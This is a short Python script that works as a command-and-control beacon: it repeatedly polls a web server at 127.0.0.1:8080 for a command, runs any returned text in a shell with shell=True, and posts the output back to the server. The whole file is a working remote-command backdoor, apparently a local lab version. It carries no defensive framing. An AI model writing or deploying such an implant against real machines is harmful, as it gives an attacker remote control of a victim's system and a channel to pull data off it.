import requests
import time
import subprocess

# Setup session for keep-alive
session = requests.Session()

while True:
    try:
        
        req = session.get("http://127.0.0.1:8080/home")
    except requests.exceptions.RequestException:
        
        continue

    # Print server response
    print("GET /home ->", req.status_code)
    print("Command from server:", repr(req.text))

    # Step 2: Run the command if not empty
    command = req.text.strip()
    if command:
        try:
            print("Running command:", command)
            result = subprocess.run(command, shell=True, capture_output=True, text=True)

            # Combine stdout and stderr
            output = result.stdout + "\n" + result.stderr
            print("Command output:\n", output)

            # Step 3: Send result back to server
            data = {
                "Result": output
            }

            resp = session.post("http://127.0.0.1:8080/home2", data=data, timeout=0.1)
            print("POST /home2 ->", resp.status_code)

        except Exception as e:
            print(f"Error running command: {e}")

    # Small delay to avoid flooding the server
    time.sleep(0.5)